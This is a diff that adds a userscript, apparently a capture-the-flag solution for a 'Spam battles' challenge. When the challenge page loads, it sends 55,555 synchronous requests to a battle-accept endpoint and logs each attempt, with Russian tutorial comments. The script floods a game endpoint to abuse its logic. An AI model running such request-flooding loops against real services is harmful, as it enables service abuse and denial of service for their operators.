@@ -1,0 +1,32 @@
+// ==UserScript==
+// @name         Spam battles - 599
+// @version      0.1
+// @description  try to take over the world!
+// @author       You
+// @match        http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/script/599/*
+// @grant        none
+// @require http://code.jquery.com/jquery-1.12.4.min.js
+// ==/UserScript==
+
+(function() {
+    'use strict';
+    var i = 0
+    while(i<55555){
+        // 1. Создаём новый объект XMLHttpRequest
+        var xhr2 = new XMLHttpRequest();
+        // 2. Конфигурируем его: GET-запрос на URL 'phones.json'
+        xhr2.open('GET', '/game/battle/accept/585', false);
+        // 3. Отсылаем запрос
+        xhr2.send();
+
+        // 4. Если код ответа сервера не 200, то это ошибка
+        if (xhr2.status != 200) {
+            // обработать ошибку
+            console.log( xhr2.status + ': ' + xhr2.statusText ); // пример вывода: 404: Not Found
+        } else {
+            // вывести результат
+            console.log("Принял запрос от 585, попытка #"+i); // responseText -- текст ответа.
+        }
+        i++;
+    }
+})();
